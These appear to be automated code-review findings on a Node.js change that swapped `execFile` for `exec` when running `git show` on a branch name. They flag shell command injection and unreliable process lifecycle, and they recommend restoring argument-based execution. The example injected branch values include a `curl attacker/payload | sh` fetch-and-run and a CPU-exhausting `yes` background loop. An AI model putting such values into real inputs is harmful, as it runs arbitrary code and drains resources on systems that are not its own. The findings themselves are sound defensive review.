findings.title: [P1] Keep branch names out of the shell
findings.body: When `branch` contains shell syntax—for example, externally supplied input such as `main; arbitrary-command`—`exec` evaluates it with the application's privileges instead of passing it literally to Git. It can also background child processes, making the returned process unreliable for lifecycle control. Preserve argument separation with `execFile("git", ["show", branch])`.

findings.title: [P2] Preserve the Git process lifecycle for branch names containing `&`
findings.body:
`exec()` returns the shell process rather than the Git process. For a valid ref such as `HEAD&`, the shell interprets `&` as backgrounding, exits before `git show HEAD` finishes, and leaves Git running. Consumers can therefore receive an early `exit` event and cannot reliably cancel the ongoing Git operation through the returned `ChildProcess`.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch names out of the shell
findings.body:
`exec` interpolates `branch` into a shell command. Any externally influenced value such as `HEAD; arbitrary-command` or `$(arbitrary-command)` executes code with the application’s privileges. The prior `execFile` call passed the branch as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass branch names as arguments instead of interpolating them into a shell command
findings.body:
`exec` invokes a shell, so an attacker-controlled branch such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. This affects any CLI, HTTP handler, or other caller that forwards untrusted branch input; the prior `execFile` implementation did not interpret shell metacharacters.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-based execution to prevent unmanaged resource-consuming subprocesses
findings.body:
On Unix, a caller-controlled branch such as `HEAD;yes>/dev/null 2>&1&` is interpreted by the shell and starts a persistent background process. Repeated calls can exhaust CPU/process capacity, while the returned `ChildProcess` only owns the shell and cannot reliably clean up descendants.

_Recommend validating this comment independently._
